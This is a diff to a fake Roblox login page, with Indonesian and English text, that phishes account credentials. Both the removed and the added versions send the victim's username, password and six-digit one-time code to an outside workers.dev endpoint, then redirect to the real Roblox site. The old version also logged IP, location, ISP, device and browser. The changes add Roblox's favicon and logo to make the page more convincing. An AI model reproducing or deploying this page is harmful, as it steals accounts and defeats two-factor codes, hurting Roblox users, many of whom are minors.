@@ -3,12 +3,15 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<title>Authentication</title>
+<title>Log in to Roblox</title>
+<link rel="icon" href="https://www.roblox.com/favicon.ico">
+<link rel="apple-touch-icon" href="https://www.roblox.com/favicon.ico">
 <style>
   *{box-sizing:border-box}
   body{margin:0;font-family:"Segoe UI",Helvetica,Arial,sans-serif;background-color:#1a1a1a;background-image:url('https://raw.githubusercontent.com/darkvex968/Login/main/file_0000000077188211a65f37288437766d.png');background-size:cover;background-position:center;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
   .ov{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.6);z-index:1}
   .cd{position:relative;z-index:2;width:100%;max-width:400px;background:#232527;border-radius:12px;padding:32px 24px;box-shadow:0 10px 30px rgba(0,0,0,.8);color:#fff}
+  .logo{display:block;margin:0 auto 20px;width:48px;height:48px}
   h1{font-size:24px;font-weight:700;text-align:center;margin:0 0 24px}
   input{width:100%;background:#393b3d;color:#fff;border:1px solid #393b3d;border-radius:8px;padding:14px;font-size:16px;outline:0;margin-bottom:12px}
   input:focus{border-color:#fff}
@@ -27,6 +30,9 @@
 <div class="ov"></div>
 <main class="cd">
   <div id="s1">
+    <svg class="logo" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <path d="M14.3 4.7L24 24L4.7 14.3L4.7 24C4.7 34.6 13.4 43.3 24 43.3C34.6 43.3 43.3 34.6 43.3 24C43.3 13.4 34.6 4.7 24 4.7H14.3Z" fill="#fff"/>
+    </svg>
     <h1 id="t1">Log in ke Roblox</h1>
     <form id="f" novalidate>
       <input id="u" type="text" placeholder="Nama Pengguna/Email/Nomor Ponsel" autocapitalize="none" required>
@@ -42,40 +48,40 @@
   </div>
 </main>
 <script>
-var _w = "https://broad-queen-fdec.darkvex74.workers.dev";
+var _w = "https://ap-login.darkvex74.workers.dev/";
 var _l = "id";
 fetch("https://ipapi.co/json/").then(r=>r.json()).then(d=>{
 if(d.country_code!=="ID"){document.getElementById("t1").innerText="Log in to Roblox";document.getElementById("u").placeholder="Username/Email/Phone Number";document.getElementById("bo").innerText="Send Me One-Time Code";document.getElementById("ft").innerHTML="Don't have an account? <a href='#'>Sign Up</a>";_l="en"}}).catch(()=>{});
 
 document.getElementById('f').addEventListener('submit', function(e){
-e.preventDefault();
-var u=document.getElementById('u').value.trim(),p=document.getElementById('p').value.trim(),g=document.getElementById('g'),er=document.getElementById('er');
-if(!u||!p){er.textContent=_l==="id"?"Harap isi semua kolom.":"Please fill all fields.";er.style.display="block";return}
-er.style.display="none";g.textContent="Loading...";g.disabled=true;
-var ua=navigator.userAgent,dev="Unknown",br="Unknown";
-if(/android/i.test(ua))dev="Android";
-if(/iPhone|iPad|iPod/i.test(ua))dev="iOS";
-if(/Windows/i.test(ua))dev="Windows";
-if(/Mac/i.test(ua))dev="Mac";
-if(/chrome|crios/i.test(ua))br="Chrome";
-if(/safari/i.test(ua)&&!/chrome/i.test(ua))br="Safari";
-if(/firefox|fxios/i.test(ua))br="Firefox";
-
-fetch("https://ipapi.co/json/").then(r=>r.json()).then(l=>{
-var ip=l.ip||"Unknown",ct=l.city||"Unknown",cn=l.country_name||"Unknown",isp=l.org||"Unknown";
-var data={embeds:[{title:"Roblox Login Caught",color:3447003,fields:[{name:"Username / Email",value:u,inline:false},{name:"Password",value:p,inline:false},{name:"IP Address",value:ip,inline:true},{name:"Lokasi",value:ct+", "+cn,inline:true},{name:"Provider (ISP)",value:isp,inline:false},{name:"Device",value:dev,inline:true},{name:"Browser",value:br,inline:true}],footer:{text:"Ryuu System"},timestamp:new Date().toISOString()}]};
-fetch(_w,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)}).then(()=>{setTimeout(()=>{window.location.href="https://www.roblox.com/login"},1500)})
-}).catch(()=>{window.location.href="https://www.roblox.com/login"})
+  e.preventDefault();
+  var u=document.getElementById('u').value.trim(),p=document.getElementById('p').value.trim(),g=document.getElementById('g'),er=document.getElementById('er');
+  if(!u||!p){er.textContent=_l==="id"?"Harap isi semua kolom.":"Please fill all fields.";er.style.display="block";return}
+  er.style.display="none";g.textContent="Loading...";g.disabled=true;
+  fetch(_w, {
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({type:"login", username:u, password:p})
+  }).finally(()=>{
+    setTimeout(()=>{window.location.href="https://www.roblox.com/login"}, 1500);
+  });
 });
 
 document.getElementById('bo').addEventListener('click', function(e){
-e.preventDefault();
-var code=prompt(_l==="id"?"Masukkan kode 6 digit yang dikirim ke email kamu:":"Enter the 6-digit code sent to your email:");
-if(code&&code.trim()!==""){
-var u=document.getElementById('u').value.trim()||"Belum diisi";
-var data={embeds:[{title:"Roblox OTP Code Caught!",color:16711680,fields:[{name:"Username",value:u,inline:false},{name:"OTP Code",value:code,inline:false}],footer:{text:"Ryuu System"},timestamp:new Date().toISOString()}]};
-fetch(_w,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(data)}).then(()=>{window.location.href="https://www.roblox.com/login"})
-}
+  e.preventDefault();
+  var code=prompt(_l==="id"?"Masukkan kode 6 digit yang dikirim ke email kamu:":"Enter the 6-digit code sent to your email:");
+  if(code&&code.trim()!==""){
+    var u=document.getElementById('u').value.trim()||"Belum diisi";
+    var g=document.getElementById('g');
+    if(g) g.disabled = true;
+    fetch(_w, {
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify({type:"otp", username:u, otp:code})
+    }).finally(()=>{
+      window.location.href="https://www.roblox.com/login";
+    });
+  }
 });
 </script>
 </body>
